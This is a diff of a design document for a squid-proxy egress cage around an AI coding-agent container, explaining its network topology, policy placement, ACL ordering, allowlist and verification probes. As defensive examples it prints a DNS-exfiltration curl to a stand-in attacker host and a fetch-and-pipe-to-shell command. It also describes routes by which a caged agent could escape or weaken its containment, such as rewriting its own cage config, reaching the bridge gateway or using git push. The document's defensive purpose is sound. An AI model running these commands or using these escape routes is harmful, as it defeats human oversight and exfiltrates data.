@@ -10,75 +10,168 @@ reconciled-at: 874e4a409b8c7877a9c05a0db8f6acbefd07b1ef
 
 # firewall — human-managed egress for the Debian image
 
-**Runtime, not build.** This is the only subsystem that is not reached from a `bootstrap.nu` step: it wraps the finished image from outside. [`../compose.yaml`](../compose.yaml) puts the cozy container on a network with no way out except a squid proxy, and [`../firewall/`](../firewall/) holds the policy that proxy enforces. It applies to the **Debian rootless** run path only (see [`build.md`](build.md)); the `sbx` path gets its own allowlist from `network.allowedDomains` in [`../sbx-kit/spec.yaml`](../sbx-kit/spec.yaml).
+**Runtime, not build.** This is the only subsystem that is not reached from a `bootstrap.nu` step: it wraps the finished image from outside.
+[`../compose.yaml`](../compose.yaml) puts the cozy container on a network with no way out except a squid proxy, and [`../firewall/`](../firewall/) holds the policy that proxy enforces.
+It applies to the **Debian rootless** run path only (see [`build.md`](build.md)); the `sbx` path gets its own allowlist from `network.allowedDomains` in [`../sbx-kit/spec.yaml`](../sbx-kit/spec.yaml).
 
-That path has two runtimes and therefore two assemblers. Under docker, `compose.yaml` declares the whole thing. Apple `container` has no compose, so [`../toolkit/container.nu`](../toolkit/container.nu) assembles the same three pieces by hand — caged network, dual-homed squid, the cozy container on the caged side only — from the same policy directory and the same digest-pinned image (`toolkit check` guards the two pins against each other; see [`toolkit.md`](toolkit.md)). It also carries two pieces compose gets for free, both of them consequences of a host-only network having no DNS. First, nothing on that network keeps its address across a start, so the cozy container's `*_PROXY` holds the proxy's *name* — the convention compose already uses with `egress` — and `set-egress-hosts` rewrites `/etc/hosts` on every `up` and `restart` to point that name wherever the proxy landed; the mapping is written by hand because there is nothing to resolve it. Second, `--no-dns` only stops the runtime from *writing* a resolver — the debian base image already carries one, unreachable inside the cage and black-holed rather than refused, so every lookup waits out the glibc timeout — and `clear-resolver` empties the file, on every `up` and `restart` so that a container created before it existed is repaired too. Docker has neither gap: it rewrites `/etc/resolv.conf` to its own embedded DNS. Everything below holds for both unless it names one.
+That path has two runtimes and therefore two assemblers.
+Under docker, `compose.yaml` declares the whole thing.
+Apple `container` has no compose, so [`../toolkit/container.nu`](../toolkit/container.nu) assembles the same three pieces by hand — caged network, dual-homed squid, the cozy container on the caged side only — from the same policy directory and the same digest-pinned image (`toolkit check` guards the two pins against each other; see [`toolkit.md`](toolkit.md)).
+It also carries two pieces compose gets for free, both of them consequences of a host-only network having no DNS.
+First, nothing on that network keeps its address across a start, so the cozy container's `*_PROXY` holds the proxy's *name* — the convention compose already uses with `egress` — and `set-egress-hosts` rewrites `/etc/hosts` on every `up` and `restart` to point that name wherever the proxy landed; the mapping is written by hand because there is nothing to resolve it.
+Second, `--no-dns` only stops the runtime from *writing* a resolver — the debian base image already carries one, unreachable inside the cage and black-holed rather than refused, so every lookup waits out the glibc timeout — and `clear-resolver` empties the file, on every `up` and `restart` so that a container created before it existed is repaired too.
+Docker has neither gap: it rewrites `/etc/resolv.conf` to its own embedded DNS.
+Everything below holds for both unless it names one.
 
 ## Why it is not in the image
 
-A firewall is runtime state. Anything baked into the image is out of the human's hands once the image is built; anything the agent can reach at runtime is not human-only. So the [`../Dockerfile`](../Dockerfile) carries **no proxy address at all** — the image stays runnable standalone with `docker run`, and the cage is something the human puts around it. A bare `docker run` therefore has no cage, and `cozy verify` fails its two `egress:` rows rather than passing quietly.
+A firewall is runtime state.
+Anything baked into the image is out of the human's hands once the image is built; anything the agent can reach at runtime is not human-only.
+So the [`../Dockerfile`](../Dockerfile) carries **no proxy address at all** — the image stays runnable standalone with `docker run`, and the cage is something the human puts around it.
+A bare `docker run` therefore has no cage, and `cozy verify` fails its two `egress:` rows rather than passing quietly.
 
 ## Why two containers instead of iptables
 
-The obvious alternative — rules inside the cozy container — needs `CAP_NET_ADMIN`, which is the capability that rewrites the policy sitting *inside the box being sealed*. The property here comes from **topology, not permissions**: the caged network is created with `internal: true`, so Docker attaches no gateway. The container has no default route, cannot resolve external names, and a raw-IP connection fails immediately. Its only neighbour is the proxy. Nothing in the stack needs `CAP_NET_ADMIN`, so the cozy container can `cap_drop: [ALL]` — which also closes the `docker exec -u root` door, since root without `NET_ADMIN` still cannot add a route.
+The obvious alternative — rules inside the cozy container — needs `CAP_NET_ADMIN`, which is the capability that rewrites the policy sitting *inside the box being sealed*.
+The property here comes from **topology, not permissions**: the caged network is created with `internal: true`, so Docker attaches no gateway.
+The container has no default route, cannot resolve external names, and a raw-IP connection fails immediately.
+Its only neighbour is the proxy.
+Nothing in the stack needs `CAP_NET_ADMIN`, so the cozy container can `cap_drop: [ALL]` — which also closes the `docker exec -u root` door, since root without `NET_ADMIN` still cannot add a route.
 
 ## Why the policy lives outside the repo
 
-`~/.config/cozy/firewall/` (overridable with `COZY_FIREWALL`) is the live policy; [`../firewall/`](../firewall/) in the repo is only a template. The reason is the development pattern itself: pointing `COZY_WORKSPACE` at the cozy checkout — how cozy is worked on, and what the README teaches — puts `compose.yaml`, the `Dockerfile` and `firewall/` inside the agent's writable mount, and all three are re-read from the host on the next `up`. An agent could delete `internal: true` from its own cage and the human's routine start-of-session command would apply it. Moving the live policy out makes "the agent cannot reach the policy" hold structurally, whatever `COZY_WORKSPACE` is set to. **The `:ro` on the proxy's mount is not the mechanism** — it protects the file from squid, not from the agent; don't cite it as the reason.
+`~/.config/cozy/firewall/` (overridable with `COZY_FIREWALL`) is the live policy; [`../firewall/`](../firewall/) in the repo is only a template.
+The reason is the development pattern itself: pointing `COZY_WORKSPACE` at the cozy checkout — how cozy is worked on, and what the README teaches — puts `compose.yaml`, the `Dockerfile` and `firewall/` inside the agent's writable mount, and all three are re-read from the host on the next `up`.
+An agent could delete `internal: true` from its own cage and the human's routine start-of-session command would apply it.
+Moving the live policy out makes "the agent cannot reach the policy" hold structurally, whatever `COZY_WORKSPACE` is set to.
+**The `:ro` on the proxy's mount is not the mechanism** — it protects the file from squid, not from the agent; don't cite it as the reason.
 
-The directory is mounted whole, not the two files individually: a bind-mounted *file* pins an inode, so an editor that saves atomically (write temp + rename) leaves squid reading the old copy while the human's edit silently never applies. An in-place append would be picked up, so the failure mode is inconsistent — and it favours the attacker.
+The directory is mounted whole, not the two files individually: a bind-mounted *file* pins an inode, so an editor that saves atomically (write temp + rename) leaves squid reading the old copy while the human's edit silently never applies.
+An in-place append would be picked up, so the failure mode is inconsistent — and it favours the attacker.
 
-The workspace default is a named volume rather than a host path, because Docker creates a missing bind-mount source as root and the unprivileged agent then cannot write its own workspace. `WORKSPACE_DIR` is set by hand to the same mount path: `sbx` injects it, compose has to, and without it `cozy sandbox-state` and `cozy dev-link` hard-error with nothing to fall back on.
+The workspace default is a named volume rather than a host path, because Docker creates a missing bind-mount source as root and the unprivileged agent then cannot write its own workspace.
+`WORKSPACE_DIR` is set by hand to the same mount path: `sbx` injects it, compose has to, and without it `cozy sandbox-state` and `cozy dev-link` hard-error with nothing to fall back on.
 
 ## Why a missing policy stops everything
 
-Three separate defaults all fail the same way — the proxy comes up healthy-looking with no policy, the cozy container comes up fine, and the human sees a working stack with mysteriously dead network. Each is turned into a loud, named failure instead:
+Three separate defaults all fail the same way — the proxy comes up healthy-looking with no policy, the cozy container comes up fine, and the human sees a working stack with mysteriously dead network.
+Each is turned into a loud, named failure instead:
 
-- The policy mount uses the long form with `create_host_path: false`. The short `src:dst:ro` form lets Docker invent the missing source as an empty root-owned directory, and squid then finds no `squid.conf`. Refusing to create it turns a forgotten `cp -r firewall ~/.config/cozy/firewall` into an error naming the path. `toolkit/container.nu` already errored on this; the two run paths now agree.
-- A `test -f /etc/squid/policy/squid.conf` healthcheck, because the directory can exist and still be empty or half-copied — which the mount cannot catch. The cozy service's `depends_on` uses `condition: service_healthy`, not the bare list form: that one waits only for "started", so a proxy that started and instantly died still let the container up.
-- **No restart policy**, on purpose. `unless-stopped` was here, and the failure this proxy actually has is a missing or unparseable policy, which no restart heals — it looped and hid the cause behind a container that was always about to be up. Now it exits once and `docker compose logs egress` says why. A proxy that stays down also fails closed: the caged container keeps its route to nowhere.
+- The policy mount uses the long form with `create_host_path: false`.
+  The short `src:dst:ro` form lets Docker invent the missing source as an empty root-owned directory, and squid then finds no `squid.conf`.
+  Refusing to create it turns a forgotten `cp -r firewall ~/.config/cozy/firewall` into an error naming the path.
+  `toolkit/container.nu` already errored on this; the two run paths now agree.
+- A `test -f /etc/squid/policy/squid.conf` healthcheck, because the directory can exist and still be empty or half-copied — which the mount cannot catch.
+  The cozy service's `depends_on` uses `condition: service_healthy`, not the bare list form: that one waits only for "started", so a proxy that started and instantly died still let the container up.
+- **No restart policy**, on purpose.
+  `unless-stopped` was here, and the failure this proxy actually has is a missing or unparseable policy, which no restart heals — it looped and hid the cause behind a container that was always about to be up.
+  Now it exits once and `docker compose logs egress` says why.
+  A proxy that stays down also fails closed: the caged container keeps its route to nowhere.
 
-The proxy image is pinned by **digest with no tag** — with both, the tag is ignored and reads as a lie (this carried `:latest` while frozen). It holds the policy and is the one container with internet, so it must not change under a `pull`. Frozen also means upstream CVE fixes never arrive; re-pin deliberately. What it points at is a build from the maintained `<squid>-<ubuntu>_edge` family — squid **7.2** on Ubuntu 26.04 when the pin was first set on 2026-08-06, moved forward by `refresh-egress` since (last on 2026-08-16, `b481a4b`). Only the digest is written down, in both files, so the tag behind the current one is whatever upstream's newest was on the day it moved. Tracking `:latest` is not the fresher alternative it looks like: upstream has not moved that tag in eight months, and it resolves to a squid 6.6 `_beta` build — so un-pinning would have pinned us to something older, with the guarantee dropped as well. The maintained stream is the `_edge` tags, and following it means re-pinning, not un-pinning.
+The proxy image is pinned by **digest with no tag** — with both, the tag is ignored and reads as a lie (this carried `:latest` while frozen).
+It holds the policy and is the one container with internet, so it must not change under a `pull`.
+Frozen also means upstream CVE fixes never arrive; re-pin deliberately.
+What it points at is a build from the maintained `<squid>-<ubuntu>_edge` family — squid **7.2** on Ubuntu 26.04 when the pin was first set on 2026-08-06, moved forward by `refresh-egress` since (last on 2026-08-16, `b481a4b`).
+Only the digest is written down, in both files, so the tag behind the current one is whatever upstream's newest was on the day it moved.
+Tracking `:latest` is not the fresher alternative it looks like: upstream has not moved that tag in eight months, and it resolves to a squid 6.6 `_beta` build — so un-pinning would have pinned us to something older, with the guarantee dropped as well.
+The maintained stream is the `_edge` tags, and following it means re-pinning, not un-pinning.
 
-**A version jump here is not a digest swap.** The first attempt at 7.2 killed the proxy outright: `unknown flag 'f'`. Canonical has rebuilt this image as a **rock**, so its entrypoint is `pebble enter`, and squid is a Pebble *service* whose command line lives in `/var/lib/pebble/default/layers/`, declared as `command: /usr/local/bin/entrypoint.sh [ -f /etc/squid/squid.conf -NYC ]`. The brackets are Pebble's default arguments; passing our own means `--args squid …`, otherwise Pebble's own flag parser takes `-f` and refuses it. Three consequences, all of them now in both run paths: the arguments carry `--args squid`; the binary is `/usr/sbin/squid-gnutls` and there is no `squid` on PATH, which every `-k parse` / `-k reconfigure` call depends on; and `PEBBLE_VERBOSE=1` is set, because Pebble keeps a service's output to itself and the refusal log would otherwise vanish from `logs`. What survived unchanged: `firewall/squid.conf` parses clean under 7.2, and `-k reconfigure` still reaches the running squid through its pid file even with Pebble as process 1 — so an allowlist edit is still a reload, not a recreate.
+**A version jump here is not a digest swap.** The first attempt at 7.2 killed the proxy outright: `unknown flag 'f'`.
+Canonical has rebuilt this image as a **rock**, so its entrypoint is `pebble enter`, and squid is a Pebble *service* whose command line lives in `/var/lib/pebble/default/layers/`, declared as `command: /usr/local/bin/entrypoint.sh [ -f /etc/squid/squid.conf -NYC ]`.
+The brackets are Pebble's default arguments; passing our own means `--args squid …`, otherwise Pebble's own flag parser takes `-f` and refuses it.
+Three consequences, all of them now in both run paths: the arguments carry `--args squid`; the binary is `/usr/sbin/squid-gnutls` and there is no `squid` on PATH, which every `-k parse` / `-k reconfigure` call depends on; and `PEBBLE_VERBOSE=1` is set, because Pebble keeps a service's output to itself and the refusal log would otherwise vanish from `logs`.
+What survived unchanged: `firewall/squid.conf` parses clean under 7.2, and `-k reconfigure` still reaches the running squid through its pid file even with Pebble as process 1 — so an allowlist edit is still a reload, not a recreate.
 
-**Moving the pin is a command, not an afternoon.** `nu toolkit/container.nu refresh-egress` asks Docker Hub for the newest tag in the maintained `<squid>-<ubuntu>_edge` family, rehearses it on a throwaway container under its own name — it must come up, take the policy and answer `-k parse` — and only then rewrites the digest in both files. It refuses to write half of them, since two run paths enforcing different proxies is what `toolkit check` exists to prevent. The pin therefore stays a digest, and the repo stays an accurate record of what is running; what changed is that finding the next one is cheap. Why not simply track a floating tag instead: `compose.yaml` cannot compute anything, so a self-updating pin would work on the `container` path alone and the two would drift — and adopting a new image is exactly the moment you want a human present, since the candidate may not start at all.
+**Moving the pin is a command, not an afternoon.** `nu toolkit/container.nu refresh-egress` asks Docker Hub for the newest tag in the maintained `<squid>-<ubuntu>_edge` family, rehearses it on a throwaway container under its own name — it must come up, take the policy and answer `-k parse` — and only then rewrites the digest in both files.
+It refuses to write half of them, since two run paths enforcing different proxies is what `toolkit check` exists to prevent.
+The pin therefore stays a digest, and the repo stays an accurate record of what is running; what changed is that finding the next one is cheap.
+Why not simply track a floating tag instead: `compose.yaml` cannot compute anything, so a self-updating pin would work on the `container` path alone and the two would drift — and adopting a new image is exactly the moment you want a human present, since the candidate may not start at all.
 
-Validate a candidate before it goes anywhere near the running cage. A throwaway `container run --rm` with the policy mounted and `-k parse` proves the entrypoint contract and the config together; a rehearsal container under a *different name* proves the rest — boot, logs, and both halves of the reload — while the live proxy keeps running. The failed first attempt cost nothing precisely because the cage fails closed: no proxy, no egress. The pin is **not** a trust statement — nothing audited the image it points at, so it is a frozen unknown, not a vetted known. It buys stable enforcer *behaviour*, so the hand-tested entries in the allowlist keep meaning what they meant; it does not buy supply-chain assurance. A bad upstream push lands at the next re-pin instead of the next `pull`, and pinning narrows that window only if a human looks in between.
+Validate a candidate before it goes anywhere near the running cage.
+A throwaway `container run --rm` with the policy mounted and `-k parse` proves the entrypoint contract and the config together; a rehearsal container under a *different name* proves the rest — boot, logs, and both halves of the reload — while the live proxy keeps running.
+The failed first attempt cost nothing precisely because the cage fails closed: no proxy, no egress.
+The pin is **not** a trust statement — nothing audited the image it points at, so it is a frozen unknown, not a vetted known.
+It buys stable enforcer *behaviour*, so the hand-tested entries in the allowlist keep meaning what they meant; it does not buy supply-chain assurance.
+A bad upstream push lands at the next re-pin instead of the next `pull`, and pinning narrows that window only if a human looks in between.
 
 ## Why no CA and no TLS interception
 
-Squid refuses the `CONNECT` **before** the handshake starts, so a blocked request never leaves the client — headers and auth tokens included. An intercepting proxy would have to read those before it could reject them, which is the opposite of what this is for. Allowed domains are tunneled end-to-end and keep the origin's own certificate; no CA is installed anywhere. `cozy verify`'s `tls:` row reads that end: it handshakes with `api.anthropic.com` and reports the issuer. Having no CA is also why the row cannot assert much *here* — it compares the issuer against the proxy CA's own CN, read from `PROXY_CA_CERT_B64`, and on this path that variable is unset. So the row is this path's positive control (an allowlisted host is genuinely reachable), and the interception assertion only bites where a CA does exist, as under `sbx`.
+Squid refuses the `CONNECT` **before** the handshake starts, so a blocked request never leaves the client — headers and auth tokens included.
+An intercepting proxy would have to read those before it could reject them, which is the opposite of what this is for.
+Allowed domains are tunneled end-to-end and keep the origin's own certificate; no CA is installed anywhere.
+`cozy verify`'s `tls:` row reads that end: it handshakes with `api.anthropic.com` and reports the issuer.
+Having no CA is also why the row cannot assert much *here* — it compares the issuer against the proxy CA's own CN, read from `PROXY_CA_CERT_B64`, and on this path that variable is unset.
+So the row is this path's positive control (an allowlisted host is genuinely reachable), and the interception assertion only bites where a CA does exist, as under `sbx`.
 
 ## What squid.conf restates and why
 
 [`../firewall/squid.conf`](../firewall/squid.conf) replaces stock `squid.conf` wholesale, so anything stock provided has to be written back:
 
-- **`Safe_ports`** — `http_access allow allowed_domains` carries no port constraint on its own. Only `CONNECT` was limited to 443, so a plain request to `http://github.com:22/` made squid open GitHub's SSH port and relay attacker-chosen bytes to it. Stock ships these ACLs for exactly this reason.
-- **`internal_dst`** — the proxy can reach what the caged container cannot (the Docker bridge gateway, other compose networks, its own loopback). Without a `dst` rule the allowlist is a name filter the agent steps around by asking the proxy to fetch an internal address for it. `dstdomain` never matches a bare IP so `deny all` already caught most of it; this makes the intent explicit and covers names that resolve inward.
-- **`dstdomain`, not regex** — it matches the host label-wise, so `api.anthropic.com.evil.example` cannot match an entry. That is why the list is domains.
-- **`deny !allowed_domains` comes before `deny internal_dst`**, and the order is the point, not style. `internal_dst` is a `dst` ACL, so squid must resolve the hostname before it can decide — and it was doing that for names it was about to refuse anyway, which made the proxy a DNS exfiltration channel: `curl -x $proxy http://<data>.attacker.example/` got the refusal logged and the lookup sent. `dstdomain` is a pure string match with no lookup, so denying the non-allowlisted name first means a blocked name never leaves the container at all — which is what "a blocked request never leaves the client" promises. The `internal_dst` rule is then reached only for hosts already on the list, whose resolve was going to happen anyway.
-- **`pinger_enable off`** — the helper needs `CAP_NET_RAW` for ICMP and logs a repeating FATAL without it, while only measuring RTT to pick between peers that do not exist here. The log should show policy decisions and nothing else.
-- **`access_log stdio:/var/log/squid/access.log`**, not `/dev/stdout` — squid drops to user `proxy`, which cannot open `/dev/stdout`, and dies at startup. The image's entrypoint already tails that path to stdout, so `docker compose logs -f egress` still shows refusals — which the human managing the list needs. Under the rock that tail is still there, but Pebble sits between it and the container's stdout and forwards nothing by default, which is why both run paths set `PEBBLE_VERBOSE=1`.
+- **`Safe_ports`** — `http_access allow allowed_domains` carries no port constraint on its own.
+  Only `CONNECT` was limited to 443, so a plain request to `http://github.com:22/` made squid open GitHub's SSH port and relay attacker-chosen bytes to it.
+  Stock ships these ACLs for exactly this reason.
+- **`internal_dst`** — the proxy can reach what the caged container cannot (the Docker bridge gateway, other compose networks, its own loopback).
+  Without a `dst` rule the allowlist is a name filter the agent steps around by asking the proxy to fetch an internal address for it.
+  `dstdomain` never matches a bare IP so `deny all` already caught most of it; this makes the intent explicit and covers names that resolve inward.
+- **`dstdomain`, not regex** — it matches the host label-wise, so `api.anthropic.com.evil.example` cannot match an entry.
+  That is why the list is domains.
+- **`deny !allowed_domains` comes before `deny internal_dst`**, and the order is the point, not style.
+  `internal_dst` is a `dst` ACL, so squid must resolve the hostname before it can decide — and it was doing that for names it was about to refuse anyway, which made the proxy a DNS exfiltration channel: `curl -x $proxy http://<data>.attacker.example/` got the refusal logged and the lookup sent.
+  `dstdomain` is a pure string match with no lookup, so denying the non-allowlisted name first means a blocked name never leaves the container at all — which is what "a blocked request never leaves the client" promises.
+  The `internal_dst` rule is then reached only for hosts already on the list, whose resolve was going to happen anyway.
+- **`pinger_enable off`** — the helper needs `CAP_NET_RAW` for ICMP and logs a repeating FATAL without it, while only measuring RTT to pick between peers that do not exist here.
+  The log should show policy decisions and nothing else.
+- **`access_log stdio:/var/log/squid/access.log`**, not `/dev/stdout` — squid drops to user `proxy`, which cannot open `/dev/stdout`, and dies at startup.
+  The image's entrypoint already tails that path to stdout, so `docker compose logs -f egress` still shows refusals — which the human managing the list needs.
+  Under the rock that tail is still there, but Pebble sits between it and the container's stdout and forwards nothing by default, which is why both run paths set `PEBBLE_VERBOSE=1`.
 
 ## What the allowlist is for
 
-[`../firewall/allowed-domains.txt`](../firewall/allowed-domains.txt) bounds **which hosts** anything inside the cage — the agent included — can reach, and nothing beyond that. It is not a code filter: squid sees only the hostname in the `CONNECT`, never the path or the body, so an allowed host that lets anyone publish carries anything through — `curl raw.githubusercontent.com/attacker/x/main/evil.sh | sh` passes the list cleanly, and `github.com`, the `githubusercontent` hosts and `ghcr.io` are all open publishing platforms. Filtering by content would need TLS interception, which is exactly what this refuses to do (see above); host-only filtering is the price of that refusal, not an oversight. It is not containment either: `github.com` carries `git push`, so with any credential in the workspace it is a full outbound channel. A much smaller list would be needed if the goal were keeping data in.
+[`../firewall/allowed-domains.txt`](../firewall/allowed-domains.txt) bounds **which hosts** anything inside the cage — the agent included — can reach, and nothing beyond that.
+It is not a code filter: squid sees only the hostname in the `CONNECT`, never the path or the body, so an allowed host that lets anyone publish carries anything through — `curl raw.githubusercontent.com/attacker/x/main/evil.sh | sh` passes the list cleanly, and `github.com`, the `githubusercontent` hosts and `ghcr.io` are all open publishing platforms.
+Filtering by content would need TLS interception, which is exactly what this refuses to do (see above); host-only filtering is the price of that refusal, not an oversight.
+It is not containment either: `github.com` carries `git push`, so with any credential in the workspace it is a full outbound channel.
+A much smaller list would be needed if the goal were keeping data in.
 
-The entries were not guessed — each was confirmed by running the real tool inside the cage. Five groups. **Claude Code**: the API, the two hosts `claude install`/`claude update` fetch from (bootstrap Step 9 fails inside the cage without them), and `code.claude.com`, the docs site `cozy docs claude` mirrors; its telemetry host is deliberately absent and nothing breaks. **git over https**: the clone hosts, plus `release-assets.githubusercontent.com`, without which `ensure-nu.sh` cannot fall back to the pinned nushell — the one recovery path when latest `nu` can't load `bootstrap.nu` — `objects` as the other host that redirect has historically landed on, and `github-cloud` where git-lfs objects actually live. **Codeberg**: `codeberg.org` alone, for git over https on Forgejo — an exact host, so if a clone stalls on a second codeberg host (release attachments, LFS) squid's 403 names it and it gets added then. **Rust**: rustup's installer, the toolchain and the crates registry, so a `cozy install nushell|zellij|polars` doesn't clone successfully and then die on crates.io — the worst-shaped failure. **Homebrew**: the three-host bottle chain (formula index → registry token + manifest → blob). The last two groups are droppable if the image's toolset is enough. Each entry carries its own caller in a comment; `api.github.com`'s sole one is nu-goodies' nightly-release check, since `git clone` does not use it and `gh` is not installed here. One exception, and it should be closed: `platform.claude.com` names no caller anywhere in the repo — the Claude group's comment covers the four hosts around it and not that one.
+The entries were not guessed — each was confirmed by running the real tool inside the cage.
+Five groups.
+**Claude Code**: the API, the two hosts `claude install`/`claude update` fetch from (bootstrap Step 9 fails inside the cage without them), and `code.claude.com`, the docs site `cozy docs claude` mirrors; its telemetry host is deliberately absent and nothing breaks.
+**git over https**: the clone hosts, plus `release-assets.githubusercontent.com`, without which `ensure-nu.sh` cannot fall back to the pinned nushell — the one recovery path when latest `nu` can't load `bootstrap.nu` — `objects` as the other host that redirect has historically landed on, and `github-cloud` where git-lfs objects actually live.
+**Codeberg**: `codeberg.org` alone, for git over https on Forgejo — an exact host, so if a clone stalls on a second codeberg host (release attachments, LFS) squid's 403 names it and it gets added then.
+**Rust**: rustup's installer, the toolchain and the crates registry, so a `cozy install nushell|zellij|polars` doesn't clone successfully and then die on crates.io — the worst-shaped failure.
+**Homebrew**: the three-host bottle chain (formula index → registry token + manifest → blob).
+The last two groups are droppable if the image's toolset is enough.
+Each entry carries its own caller in a comment; `api.github.com`'s sole one is nu-goodies' nightly-release check, since `git clone` does not use it and `gh` is not installed here.
+One exception, and it should be closed: `platform.claude.com` names no caller anywhere in the repo — the Claude group's comment covers the four hosts around it and not that one.
 
-Editing the list is a restart, not a rebuild: `docker compose restart egress`, or `nu toolkit/container.nu reload-egress <name>` on Apple `container`. Watch what gets refused with `docker compose logs -f egress`.
+Editing the list is a restart, not a rebuild: `docker compose restart egress`, or `nu toolkit/container.nu reload-egress <name>` on Apple `container`.
+Watch what gets refused with `docker compose logs -f egress`.
 
 ## Limits accepted, not fixed
 
-- **The Docker bridge gateway stays reachable.** `internal: true` removes the default route but the bridge address is in-subnet, so a process bound on the host's `0.0.0.0` — a dev server, a proxy — can still be reached directly, bypassing the allowlist. Confirmed on Docker 29.6 by proxying a blocked request through a host-bound squid from inside the cage. A container's *published* port (`-p`) is not reachable that way: the packet needs forwarding out of the internal network, which Docker drops, so it times out. Closing it needs a host-level `DOCKER-USER` rule, which compose cannot express, so it is documented as residual risk in [`../README.md`](../README.md) instead.
-- **git over ssh does not cross the cage.** squid allows `CONNECT` to 443 only and ssh cannot speak to an HTTP proxy at all, so a `git@github.com:` remote fails inside whatever key the container holds — https remotes are the way through. `container.nu up --ssh-agent` forwards the host's agent socket anyway, because what it buys needs no network: with `git config gpg.format ssh` the host's key signs commits made inside the container without ever entering it. The runtime re-reads the host's `SSH_AUTH_SOCK` on every start, so the forward follows an agent that moved; `up` refuses when nothing answers at that socket, rather than starting a container whose forward silently did not happen.
-- **`COZY_WORKSPACE` must not contain this repo**, or any copy of the policy (see above). Accepted on the docker path only, where `compose.yaml` states it in a comment and nothing enforces it. The Apple `container` path stopped accepting it: `reject-writable` in [`../toolkit/container.nu`](../toolkit/container.nu) refuses to start when any **writable** mount overlaps the cozy checkout or the policy directory — `:ro` is exempt, since read-only removes exactly the ability the rule is about. It had already been stepped on once, which is why one path turned the comment into an error.
-- **`/var/run/docker.sock` must never be mounted into the agent**, and the agent must never join the `docker` group. That is root on the host; no network policy survives it.
+- **The Docker bridge gateway stays reachable.** `internal: true` removes the default route but the bridge address is in-subnet, so a process bound on the host's `0.0.0.0` — a dev server, a proxy — can still be reached directly, bypassing the allowlist.
+  Confirmed on Docker 29.6 by proxying a blocked request through a host-bound squid from inside the cage.
+  A container's *published* port (`-p`) is not reachable that way: the packet needs forwarding out of the internal network, which Docker drops, so it times out.
+  Closing it needs a host-level `DOCKER-USER` rule, which compose cannot express, so it is documented as residual risk in [`../README.md`](../README.md) instead.
+- **git over ssh does not cross the cage.** squid allows `CONNECT` to 443 only and ssh cannot speak to an HTTP proxy at all, so a `git@github.com:` remote fails inside whatever key the container holds — https remotes are the way through.
+  `container.nu up --ssh-agent` forwards the host's agent socket anyway, because what it buys needs no network: with `git config gpg.format ssh` the host's key signs commits made inside the container without ever entering it.
+  The runtime re-reads the host's `SSH_AUTH_SOCK` on every start, so the forward follows an agent that moved; `up` refuses when nothing answers at that socket, rather than starting a container whose forward silently did not happen.
+- **`COZY_WORKSPACE` must not contain this repo**, or any copy of the policy (see above).
+  Accepted on the docker path only, where `compose.yaml` states it in a comment and nothing enforces it.
+  The Apple `container` path stopped accepting it: `reject-writable` in [`../toolkit/container.nu`](../toolkit/container.nu) refuses to start when any **writable** mount overlaps the cozy checkout or the policy directory — `:ro` is exempt, since read-only removes exactly the ability the rule is about.
+  It had already been stepped on once, which is why one path turned the comment into an error.
+- **`/var/run/docker.sock` must never be mounted into the agent**, and the agent must never join the `docker` group.
+  That is root on the host; no network policy survives it.
 - **`cozy verify` is a smoke test, not a tamper detector** — it lives at a path the agent owns.
 
 ## How the cage is checked
 
-Twice, by two different callers, with the same probe. At **launch**, `assert-caged` in [`../toolkit/container.nu`](../toolkit/container.nu) runs it from inside the freshly started container on every `up` and `restart`: a builder that reports success without looking at its own result is the gap being closed, since an existing network is only a name and nothing observable proves it was created with `--internal`. A real HTTP status means the cage is open; *no* status counts as failure too, because "we could not check" must not read as "it is fine". Either way the container is stopped before the error is raised — leaving it up would keep the leak open for as long as the human takes to read the message.
+Twice, by two different callers, with the same probe.
+At **launch**, `assert-caged` in [`../toolkit/container.nu`](../toolkit/container.nu) runs it from inside the freshly started container on every `up` and `restart`: a builder that reports success without looking at its own result is the gap being closed, since an existing network is only a name and nothing observable proves it was created with `--internal`.
+A real HTTP status means the cage is open; *no* status counts as failure too, because "we could not check" must not read as "it is fine".
+Either way the container is stopped before the error is raised — leaving it up would keep the leak open for as long as the human takes to read the message.
 
-Then **on demand**, two rows in [`../cozy-module/verify.nu`](../cozy-module/verify.nu), both shaped by false passes found in review. `egress: no direct route` probes an IP literal with the proxy bypassed and requires the attempt to fail — this is what `internal: true` actually provides, and unlike reading `*_PROXY` it cannot be faked by an env var on a normal bridge network. `egress: default deny` sends a canary over **plain http**, where a real refusal is a 403 block page; over https every flavour of no-network (dead proxy, unresolvable name, timeout) also yields `000`, so a broken cage would have scored the strongest pass. It is pointed at the proxy with `-x` rather than through the environment, because curl honours only the lowercase `http_proxy` for http URLs while sbx sets just the uppercase one.
+Then **on demand**, two rows in [`../cozy-module/verify.nu`](../cozy-module/verify.nu), both shaped by false passes found in review.
+`egress: no direct route` probes an IP literal with the proxy bypassed and requires the attempt to fail — this is what `internal: true` actually provides, and unlike reading `*_PROXY` it cannot be faked by an env var on a normal bridge network.
+`egress: default deny` sends a canary over **plain http**, where a real refusal is a 403 block page; over https every flavour of no-network (dead proxy, unresolvable name, timeout) also yields `000`, so a broken cage would have scored the strongest pass.
+It is pointed at the proxy with `-x` rather than through the environment, because curl honours only the lowercase `http_proxy` for http URLs while sbx sets just the uppercase one.
